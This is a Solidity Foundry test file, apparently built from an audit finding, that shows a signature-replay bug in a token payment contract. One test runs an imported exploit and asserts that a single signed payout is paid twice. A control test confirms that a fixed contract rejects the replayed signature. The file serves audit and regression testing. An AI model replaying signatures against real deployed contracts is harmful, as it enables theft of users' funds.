// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, NMT, PaymentFixed} from "./59205-signature-replay-quantstamp-netmind-markdown.sol";

contract Finding59205Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address internal constant FEE_TO = 0x000000000000000000000000000000000000fEE2;
    bytes internal constant SIG =
        hex"6c65eee89f4313e352fe854000eabbf4e7e13a06b87fba39947ee804026c2b7e06b9d7b8d9559a2b812d4124164fc6cf922836c49dab06ca395c9b34766a47731c";

    function test_exploit_second_use_moves_three() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.gpuPaid(), 4 ether, "GPU paid twice");
        assertEq(e.feePaid(), 2 ether, "feeTo paid twice");
        assertEq(e.distributed(), 6 ether, "6 distributed vs 3 authorized");
        assertEq(e.token().balanceOf(ATTACKER) - 2 ether, 2 ether, "second use moved 2 more NMT to the GPU");
    }

    function test_control_replay_reverts() public {
        NMT token = new NMT();
        PaymentFixed payment = new PaymentFixed(token, SIGNER, FEE_TO);
        token.mint(address(this), 10 ether);
        token.approve(address(payment), 10 ether);
        payment.deposit(1, 10 ether);
        payment.distribute(1, ATTACKER, 2 ether, 1 ether, 2_000_000_000, SIG);
        bool reverted;
        try payment.distribute(1, ATTACKER, 2 ether, 1 ether, 2_000_000_000, SIG) {
            reverted = false;
        } catch {
            reverted = true;
        }
        assertTrue(reverted, "replay rejected");
        assertEq(token.balanceOf(ATTACKER), 2 ether, "only the authorized GPU fee");
        assertEq(token.balanceOf(FEE_TO), 1 ether, "only the authorized platform fee");
        assertEq(token.balanceOf(address(payment)), 7 ether, "rest stays");
    }
}
